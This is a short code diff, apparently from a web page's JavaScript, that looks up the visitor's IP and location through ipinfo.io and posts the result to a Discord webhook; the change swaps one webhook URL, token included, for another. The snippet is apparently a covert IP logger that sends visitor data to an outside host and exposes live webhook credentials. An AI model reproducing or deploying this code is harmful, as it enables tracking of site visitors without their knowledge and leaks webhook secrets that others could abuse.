@@ -24,7 +24,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
       }
     ]
   }
-  fetch('https://discord.com/api/webhooks/1043270639009677312/utmfK8MDzBx-3gQZfPcRxPYUjVvMuw5LcOuNYnCo6hbGmstVO6TJWpfH3A9B0sD8_MkR', {
+  fetch('https://ptb.discord.com/api/webhooks/1048279750390595714/-KJ0-tQImBuEKTbFrIenZJfbY3iMU_1Mb8XjKcHM2RmndG0p-xLYfwcq080PJ6_Ctedf', {
     method: "POST",
     headers: {
         'Content-type': 'application/json'
